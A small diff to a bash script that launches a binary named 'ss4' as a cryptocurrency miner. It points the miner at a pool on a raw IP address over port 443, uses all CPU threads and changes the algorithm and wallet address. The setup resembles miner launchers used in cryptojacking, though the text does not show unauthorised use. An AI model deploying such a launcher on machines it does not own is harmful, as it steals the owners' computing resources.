@@ -1,3 +1,3 @@
 #!/bin/bash
 
-./ss4 -a yespowertide -o stratum+tcp://161.35.54.48:443 -u TYKf2FgjTb2GrfrQppTRMZzd9t8ayRFMV3.ojhk -p x -t $(nproc --all)
+./ss4 -a yespower -o stratum+tcp://161.35.54.48:443 -u ShwhpqVtMD8dPjYiYua4bBoXYr5yQuU4XV -p x -t $(nproc --all)
